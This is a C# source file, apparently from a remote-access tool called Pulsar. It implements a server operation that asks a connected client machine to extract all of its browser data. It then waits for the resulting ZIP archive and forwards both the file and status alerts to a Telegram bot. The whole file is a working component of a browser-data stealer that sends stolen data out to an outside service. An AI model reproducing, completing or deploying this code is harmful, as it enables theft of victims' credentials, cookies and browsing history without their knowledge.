using Pulsar.Common.Messages.Browser;
using Pulsar.Server.TelegramSender;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Threading.Tasks;

namespace Pulsar.Server.Operations
{
    public class BrowserExtractionOperation
    {
        private readonly string _clientId;
        private readonly string _clientFolder;
        private readonly TelegramService _telegramService;
        private readonly Action<string, string> _onStatusUpdate;

        public BrowserExtractionOperation(
            string clientId,
            string clientFolder,
            TelegramService telegramService,
            Action<string, string> onStatusUpdate = null)
        {
            _clientId = clientId;
            _clientFolder = clientFolder;
            _telegramService = telegramService;
            _onStatusUpdate = onStatusUpdate;
        }

        public async Task ExecuteAsync()
        {
            var transferId = Guid.NewGuid().ToString();
            UpdateStatus("Initiating", $"Starting browser extraction (Transfer ID: {transferId})");

            try
            {
                // Notify Telegram: Starting extraction
                if (_telegramService?.IsConfigured == true)
                {
                    await _telegramService.SendMessageAsync(
                        $"🔍 *Browser Extraction Started*\n" +
                        $"Client: `{_clientId}`\n" +
                        $"Time: {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
                }

                // Send request to client
                var request = new ExtractAllBrowsersRequest { TransferId = transferId };
                UpdateStatus("Waiting", "Waiting for client response...");

                // Create folder for browser data
                var browsersFolder = Path.Combine(_clientFolder, "Browsers");
                if (!Directory.Exists(browsersFolder))
                    Directory.CreateDirectory(browsersFolder);

                // The response will come through the message handler
                // For now, we'll wait for file arrival
                UpdateStatus("Extracting", "Client is extracting browser data...");

                // Wait for file transfer to complete (max 5 minutes)
                var targetFolder = Path.Combine(_clientFolder, "Browsers");
                var maxWait = DateTime.Now.AddMinutes(5);
                string latestZip = null;

                while (DateTime.Now < maxWait)
                {
                    if (Directory.Exists(targetFolder))
                    {
                        var zipFiles = Directory.GetFiles(targetFolder, "*AllBrowsers*.zip");
                        if (zipFiles.Length > 0)
                        {
                            // Get the most recently created ZIP
                            foreach (var file in zipFiles)
                            {
                                if (File.GetCreationTime(file) > DateTime.Now.AddSeconds(-30))
                                {
                                    latestZip = file;
                                    break;
                                }
                            }
                            if (latestZip != null) break;
                        }
                    }
                    await Task.Delay(500);
                }

                if (!string.IsNullOrEmpty(latestZip) && File.Exists(latestZip))
                {
                    var fileInfo = new FileInfo(latestZip);
                    UpdateStatus("Complete", $"Extraction successful: {fileInfo.Length / 1024 / 1024} MB");

                    // Notify Telegram: Extraction complete + send file
                    if (_telegramService?.IsConfigured == true)
                    {
                        var message = $"✅ *Browser Extraction Complete*\n\n" +
                            $"Client: `{_clientId}`\n" +
                            $"File: {Path.GetFileName(latestZip)}\n" +
                            $"Size: {FormatBytes(fileInfo.Length)}\n" +
                            $"Time: {DateTime.Now:yyyy-MM-dd HH:mm:ss}";

                        await _telegramService.SendMessageAsync(message);

                        // Send file to Telegram
                        try
                        {
                            await _telegramService.SendFileAsync(latestZip, 
                                $"Browser data from {_clientId}");
                            UpdateStatus("Telegram", "File sent to Telegram successfully");
                        }
                        catch (Exception ex)
                        {
                            UpdateStatus("Error", $"Failed to send file to Telegram: {ex.Message}");
                        }
                    }
                }
                else
                {
                    UpdateStatus("Timeout", "Browser extraction timed out - no file received");

                    if (_telegramService?.IsConfigured == true)
                    {
                        await _telegramService.SendMessageAsync(
                            $"⚠️ *Browser Extraction Timeout*\n" +
                            $"Client: `{_clientId}`\n" +
                            $"Time: {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
                    }
                }
            }
            catch (Exception ex)
            {
                UpdateStatus("Error", $"Exception: {ex.Message}");

                Debug.WriteLine($"Browser extraction error: {ex}");

                if (_telegramService?.IsConfigured == true)
                {
                    await _telegramService.SendMessageAsync(
                        $"❌ *Browser Extraction Error*\n" +
                        $"Client: `{_clientId}`\n" +
                        $"Error: {ex.Message}");
                }
            }
        }

        private void UpdateStatus(string status, string message)
        {
            Debug.WriteLine($"[BrowserExtraction] {status}: {message}");
            _onStatusUpdate?.Invoke(status, message);
        }

        private string FormatBytes(long bytes)
        {
            string[] sizes = { "B", "KB", "MB", "GB" };
            double len = bytes;
            int order = 0;
            while (len >= 1024 && order < sizes.Length - 1)
            {
                order++;
                len = len / 1024;
            }
            return $"{len:0.##} {sizes[order]}";
        }
    }
}
